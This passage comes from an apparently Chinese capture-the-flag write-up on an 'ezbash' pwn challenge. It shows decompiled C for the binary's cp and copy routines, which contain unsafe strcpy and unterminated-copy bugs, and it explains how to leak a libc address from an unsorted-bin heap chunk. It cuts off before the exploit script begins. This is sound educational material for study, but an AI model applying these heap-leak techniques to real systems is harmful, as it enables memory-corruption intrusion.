class=&#34;number&#34;&gt;0xFFF&lt;/span&gt;)) = *(&amp;amp;v6[&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;] + (v1 &amp;amp; &lt;span class=&#34;number&#34;&gt;0xFFF&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  dest = v6;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( nums == &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;fprintf&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;ezbash: missing destination file operand after &amp;#x27;%s&amp;#x27;\n&amp;quot;&lt;/span&gt;, comment[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;strcpy&lt;/span&gt;(dest, comment[nums]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ( s1 = strtok(dest, delim); ; s1 = strtok(&lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;, delim) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !s1 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ( i = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;; i &amp;lt; nums; ++i )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        copied_file = curops-&amp;gt;firstson;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v9 = findfile(&amp;amp;copied_file, comment[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v9 != &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; || !checkfile(copied_file) )&lt;span class=&#34;comment&#34;&gt;// 未找到 ，或者不是个文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;fprintf&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;ezbash: cannot stat &amp;#x27;%s&amp;#x27;: No such file or directory\n&amp;quot;&lt;/span&gt;, comment[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;                                       &lt;span class=&#34;comment&#34;&gt;// 索引最后一个file&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          destination = cuurr_pos-&amp;gt;firstson;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          v8 = findfile(&amp;amp;destination, comment[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v8 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            copy(copied_file, destination);     &lt;span class=&#34;comment&#34;&gt;// 文件复制到其他位置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            cuurr_pos = curops;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            curr = cuurr_pos-&amp;gt;firstson;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            temp = calloc40();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            temp-&amp;gt;flag = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            copy_name(temp, copied_file-&amp;gt;name);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( copied_file-&amp;gt;context )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              copycontext(copied_file, temp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              temp-&amp;gt;context = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( curr )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              link(curr, temp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              cuurr_pos-&amp;gt;firstson = temp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      cuurr_pos = curops;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v10 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( &lt;span class=&#34;built_in&#34;&gt;strcmp&lt;/span&gt;(s1, &lt;span class=&#34;string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LABEL_32:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !&lt;span class=&#34;built_in&#34;&gt;strcmp&lt;/span&gt;(s1, off_4077) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cuurr_pos = cuurr_pos-&amp;gt;futher;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_32;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt; = cuurr_pos-&amp;gt;firstson;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v10 = findfile(&amp;amp;&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;, s1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( nums &amp;gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v10 != &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; || !checkfolder(&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;fprintf&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;ezbash: target &amp;#x27;%s&amp;#x27; is not a directory\n&amp;quot;&lt;/span&gt;, comment[nums]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      cuurr_pos = curops;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cuurr_pos = &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_32;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( nums != &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_32;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v4 = v13;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v5 = &lt;span class=&#34;built_in&#34;&gt;strlen&lt;/span&gt;(s1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( &lt;span class=&#34;built_in&#34;&gt;strcmp&lt;/span&gt;(&amp;amp;dest[v4 - v5], s1) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_32;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  copied_file = curops-&amp;gt;firstson;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  destination = curops-&amp;gt;firstson;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v9 = findfile(&amp;amp;copied_file, comment[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v9 != &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;fprintf&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;ezbash: cannot stat &amp;#x27;%s&amp;#x27;: No such file or directory\n&amp;quot;&lt;/span&gt;, comment[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cuurr_pos = curops;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !checkfile(copied_file) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;fprintf&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;ezbash: -r not specified; omitting directory &amp;#x27;%s&amp;#x27;\n&amp;quot;&lt;/span&gt;, comment[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cuurr_pos = curops;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v8 = findfile(&amp;amp;destination, s1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v8 == &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( checkfolder(destination) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      cuurr_pos = destination;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( checkfile(destination) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      copy(copied_file, destination);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      cuurr_pos = curops;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_32;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ptr = calloc40();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ptr-&amp;gt;flag = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  copy_name(ptr, comment[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( copied_file-&amp;gt;context )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    copycontext(copied_file, ptr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  link(cuurr_pos-&amp;gt;firstson, ptr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cuurr_pos = curops;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *__fastcall &lt;span class=&#34;title function_&#34;&gt;copy&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(file *src, file *des)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *result; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file *dest; &lt;span class=&#34;comment&#34;&gt;// [rsp+0h] [rbp-20h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v4; &lt;span class=&#34;comment&#34;&gt;// [rsp+18h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v5; &lt;span class=&#34;comment&#34;&gt;// [rsp+1Ch] [rbp-4h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  dest = des;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  result = src;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( src != des &amp;amp;&amp;amp; (src-&amp;gt;context || (result = des-&amp;gt;context) != &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( src-&amp;gt;context || !des-&amp;gt;context )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( src-&amp;gt;context &amp;amp;&amp;amp; des-&amp;gt;context )       &lt;span class=&#34;comment&#34;&gt;// 文件复制到文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v4 = &lt;span class=&#34;built_in&#34;&gt;strlen&lt;/span&gt;(src-&amp;gt;context);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v5 = &lt;span class=&#34;built_in&#34;&gt;strlen&lt;/span&gt;(des-&amp;gt;context);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v4 &amp;gt; v5 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          dest = &lt;span class=&#34;built_in&#34;&gt;realloc&lt;/span&gt;(des-&amp;gt;context, v4 + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;memset&lt;/span&gt;(dest-&amp;gt;context, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, v4 + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;memset&lt;/span&gt;(des-&amp;gt;context, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, v5);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        result = &lt;span class=&#34;built_in&#34;&gt;strncpy&lt;/span&gt;(dest-&amp;gt;context, src-&amp;gt;context, v4);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;                                      &lt;span class=&#34;comment&#34;&gt;// 没有context&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        result = src-&amp;gt;context;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( result )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          result = des-&amp;gt;context;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !result )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            result = copycontext(src, des);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(des-&amp;gt;context);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      result = des;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      des-&amp;gt;context = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; result;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *__fastcall &lt;span class=&#34;title function_&#34;&gt;copycontext&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(file *src, file *dest)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v3; &lt;span class=&#34;comment&#34;&gt;// [rsp+1Ch] [rbp-4h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v3 = &lt;span class=&#34;built_in&#34;&gt;strlen&lt;/span&gt;(src-&amp;gt;context);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  dest-&amp;gt;context = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(v3);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;memset&lt;/span&gt;(dest-&amp;gt;context, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, v3);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;strncpy&lt;/span&gt;(dest-&amp;gt;context, src-&amp;gt;context, v3);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里 echo 是的我们的 context 大小是固定的，但是这里我们可以 malloc 指定的大小，大小根据我们拷问的文件内容的长度计算。另外一点，cp 不会向目标额外写入空字符。&lt;/p&gt;
&lt;h3 id=&#34;泄露libc地址&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#泄露libc地址&#34;&gt;#&lt;/a&gt; 泄露 libc 地址&lt;/h3&gt;
&lt;p&gt;这是一个很无语的过程，因为 echo 的话，一定会清空数据。所以就是利用 cp，把 unsortedbins 的 chunk 申请出来，因为 copycontext 不会清空 chunk。所以我们申请一个 0x8，因为不会写入空字符，就可以把 unsortedbins 申请出来的堆块的前八字节覆盖，到那时保留了 bk 指针，同时也跟前八字节组成新的字符串。这样就泄露了 libc 的地址。为了方便，我们把要拷贝的文件的 context 的 chunksize 写大一点，后面会比较方便。入下面的 cccc 文件，context 的 chunksize=0x551&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span 